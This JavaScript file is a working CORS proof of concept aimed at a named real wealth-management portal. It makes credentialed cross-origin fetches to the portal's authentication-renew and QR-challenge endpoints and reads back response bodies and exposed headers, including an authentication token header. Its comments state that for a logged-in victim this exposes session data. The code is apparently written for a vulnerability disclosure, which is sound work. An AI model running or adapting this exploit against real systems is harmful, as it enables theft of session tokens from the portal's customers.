const output = document.getElementById("output");

// Optional: append ?username=<user> to the PoC page URL to mirror the portal's own renew call.
const user = new URLSearchParams(location.search).get("username");

// Headers the server lists in Access-Control-Expose-Headers.
const exposed = [
  "Frontgate-Authentication-Token",
  "Frontgate-Authentication-Type",
  "Frontgate-Host",
  "Content-Type",
  "Date"
];

// Two cross-origin reads against portfolio.stonehagefleming.com:
//  1. authn/renew  — the auth API. For a logged-in victim this response carries the
//                    session + any Frontgate-Authentication-Token, readable cross-origin.
//                    Unauthenticated it returns 401, so this proves the READ PATH.
//  2. qrcode/challenge — a 200 endpoint returning a real JSON body, proving the browser
//                    hands this origin the full response data cross-origin, not just an error.
//                    (This challenge is tied to THIS request/IP, so it demonstrates
//                    readability of live server data, not theft of a victim's data.)
const targets = [
  {
    label: "1. authn/renew (auth API — carries victim session when logged in)",
    url: "https://portfolio.stonehagefleming.com/LOSSPI-external/2.0/authn/renew" +
         (user ? "?username=" + encodeURIComponent(user) + "&cliid_appl=g3web_LODH" : "")
  },
  {
    label: "2. qrcode/challenge (200 — real JSON response body read cross-origin)",
    url: "https://portfolio.stonehagefleming.com/G3WebApi/rest/qrcode/challenge?cliid_appl=g3web_STHG"
  }
];

async function read(target) {
  try {
    const response = await fetch(target.url, { method: "GET", credentials: "include" });
    const body = await response.text();
    const headers = exposed
      .map(h => h + ": " + (response.headers.get(h) ?? "(absent)"))
      .join("\n");
    return target.label +
      "\nRequest: " + target.url +
      "\nStatus: " + response.status +
      "\n\nExposed headers read cross-origin:\n" + headers +
      "\n\nResponse body read cross-origin:\n" + body;
  } catch (error) {
    return target.label +
      "\nRequest: " + target.url +
      "\n\nRequest failed:\n" + error;
  }
}

(async () => {
  const blocks = [];
  for (const t of targets) {
    blocks.push(await read(t));
  }
  output.textContent = "Origin: " + location.origin + "\n\n" + blocks.join("\n\n----------\n\n");
})();
